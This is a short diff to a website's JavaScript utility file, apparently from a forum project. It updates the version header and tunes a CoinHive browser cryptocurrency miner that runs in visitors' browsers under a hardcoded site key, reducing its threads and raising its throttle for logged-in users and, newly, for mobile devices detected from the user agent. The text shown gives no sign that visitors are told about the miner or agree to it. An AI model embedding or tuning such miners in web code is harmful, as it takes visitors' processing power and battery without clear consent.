@@ -21,7 +21,7 @@
  * @author <a href="http://vanessa.b3log.org">Liyuan Li</a>
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
  * @author Zephyr
- * @version 1.44.0.0, Dec 5, 2017
+ * @version 1.44.0.1, Dec 23, 2017
  */
 
 /**
@@ -44,6 +44,10 @@ var Util = {
     }).done(function () {
       var data = {threads: 2, throttle: 0.5}
       if (Label.isLoggedIn) {
+        data = {threads: 1, throttle: 0.8}
+      }
+      $.ua.set(navigator.userAgent);
+      if ($.ua.device && $.ua.device.type === 'mobile') {
         data = {threads: 1, throttle: 0.8}
       }
       var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', data);
